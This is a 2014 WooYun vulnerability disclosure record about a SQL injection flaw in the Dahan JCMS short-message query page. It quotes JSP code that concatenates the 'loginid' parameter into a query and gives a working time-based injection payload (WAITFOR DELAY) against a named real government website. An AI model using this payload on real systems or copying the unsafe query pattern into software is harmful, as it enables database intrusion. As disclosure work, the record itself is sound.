{"id": 55209, "wybug_id": "wooyun-2014-061819", "wybug_title": "大汉JCMS 注入漏洞3", "wybug_corp": "南京大汉网络有限公司", "wybug_author": "Matt", "wybug_date": "2014-05-22 10:49", "wybug_open_date": "2014-08-20 10:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-25：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-20：\t细节向公众公开  简要描述： 大汉JCMS 注入漏洞3 详细说明：  short_message/que_sendmsg.jsp\nString strTitle = \"\";\t/*检索关键字*/\tString groupname = \"\";\tString id = Convert.getParameter(request, \"loginid\", \"a\");//获取参数\tString boxtype = Convert.getParameter(request, \"boxtype\", \"a\");\tstrTitle += groupname;\t\t// 获取表单提交变量(条件参数)\tString strQueKeyWords = \"\";//关键字\tString strQueKeyWords1 = \"\";//高级检索关键字\tString strQueScope = \"\";//范围\tString strStartDate = \"\";//开始日期\tString strEndDate = \"\";//结束日期\t\tstrQueKeyWords \t= Convert.getParameter(request, \"que_keywords\");\tstrQueKeyWords1 = Convert.getParameter(request, \"que_keywords1\");\tstrQueScope \t= Convert.getParameter(request, \"que_scope\");\tstrStartDate \t= Convert.getParameter(request, \"que_startdate\");\tstrEndDate \t\t= Convert.getParameter(request, \"que_enddate\");\tstrQueKeyWords \t= (strQueKeyWords1.length() > 0) ? strQueKeyWords1\t\t\t: strQueKeyWords;//高级检索的关键字优先\t//组织时间条件\tString strDateCond = \"\";\tif (!\"\".equals(strStartDate) && !\"\".equals(strEndDate)) {\t\tstrDateCond += \" AND a.dt_sendtime >= '\" + strStartDate \t\t+ \" 00:00:00' AND a.dt_sendtime <= '\" + strEndDate + \" 23:59:59'\";\t} else if (!\"\".equals(strStartDate) && \"\".equals(strEndDate)) {\t\tstrDateCond += \" AND a.dt_sendtime >= '\" + strStartDate + \" 00:00:00'\";\t} else if (\"\".equals(strStartDate) && !\"\".equals(strEndDate)) {\t\tstrDateCond += \" AND a.dt_sendtime <= '\" + strEndDate + \" 23:59:59'\";\t}\t\t// 查询条件部分\tStringBuffer sbWhere = new StringBuffer(128);\tstrTitle = \"当前位置→发件箱\";\tsbWhere.append(\" a.vc_senderid='\"+ id +\"'\");//插入参数\n   漏洞证明：  打开http://www.sihong.gov.cn/jcms/short_message/que_sendmsg.jsp?loginid=1 返回时间正常打开http://www.sihong.gov.cn/jcms/short_message/que_sendmsg.jsp?loginid=1' ; WAITFOR DELAY '0:0:5'-- 延时了\n\n   修复方案：  过滤   版权声明：转载请注明来源 Matt@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-05-22 11:14 厂商回复： 问题重复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}